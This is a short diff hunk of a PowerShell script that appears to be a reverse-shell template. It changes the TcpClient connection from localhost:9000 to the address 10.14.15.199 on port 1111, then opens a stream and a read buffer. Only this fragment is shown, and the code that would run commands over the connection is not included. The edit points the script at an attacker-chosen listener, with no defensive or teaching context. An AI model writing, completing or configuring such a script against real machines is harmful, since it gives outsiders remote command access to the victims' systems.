@@ -15,7 +15,7 @@ $data = $null;
 $result = $null;
 try {
 	# change the host address and/or port number as necessary
-	$client = New-Object Net.Sockets.TcpClient("127.0.0.1", 9000);
+	$client = New-Object Net.Sockets.TcpClient("10.14.15.199", 1111);
 	$stream = $client.GetStream();
 	$buffer = New-Object Byte[] 1024;
 	$encoding = New-Object Text.AsciiEncoding;
